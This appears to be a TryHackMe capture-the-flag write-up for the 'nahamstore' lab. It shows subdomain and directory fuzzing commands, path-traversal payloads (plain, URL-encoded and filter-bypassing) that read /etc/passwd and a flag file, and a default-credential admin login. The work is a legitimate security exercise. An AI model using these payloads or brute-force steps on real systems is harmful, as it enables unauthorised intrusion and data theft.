*Writeup for nahamstore on TryHackMe*
First, the `/etc/hosts`
```
ip    nahamstore.thm
ip    www.nahamstore.thm
ip    something.nahamstore.thm
```
Attempt subdomain enumeration with gobuster or ffuf
```gobuster
gobuster dns -d nahamstore.thm -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt
```
```ffuf
ffuf -u http://nahamstore.thm -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -H 'Host: FUZZ.nahamstore.thm' -fw 125
```
The obtained subdomains are:
>shop
>marketing
>stock
>!Add them to the /etc/hosts file
 nahamstore-2020
 nahamstore-2020-dev

**Start using the site map on the target option on Burp with foxy proxy to map the site**

#### Local File Inclusion
http://nahamstore.thm/product/picture/?file=cbf45788a7c3ff5c2fab3cbe740595d4.jpg
The only place where this vulnerability could be found is in the way images for the products are displayed
http://nahamstore.thm/product/picture/?file=./cbf45788a7c3ff5c2fab3cbe740595d4.jpg
http://nahamstore.thm/product/picture/?file=../../../../../../../../../../../etc/passwd
http://nahamstore.thm/product/picture/?file=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
http://nahamstore.thm/product/picture/?file=..././..././..././..././..././..././..././..././..././..././etc/passwd
http://nahamstore.thm/product/picture/?file=..././..././..././..././..././..././..././..././..././..././lfi/flag.txt
View the server response for this last request in burp and you've got the flag owo

Scan the most common webserver ports on the different domains
-p22,80,443,8000,8080,8443,10000
8080 appears as an open port
Enumerate files and directories in this service and on the different subdomains
```ffuf
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -u http://nahamstore.thm:8000/FUZZ -t 50 -c -ac
```
Found 8080/admin/login
Brute force with intruder or hydra, username:admin password:admin

Directory and file enumeration with ffuf 
```ffuf
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -u http://nahamstore-2020-dev.nahamstore.thm/FUZZ -t 50 -c -ac
```
Discover /api
Fuzz /api
```ffuf
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -u http://nahamstore-2020-dev.nahamstore.thm/api/FUZZ -t 50 -c -ac
```
Discover /customers?customer_id=#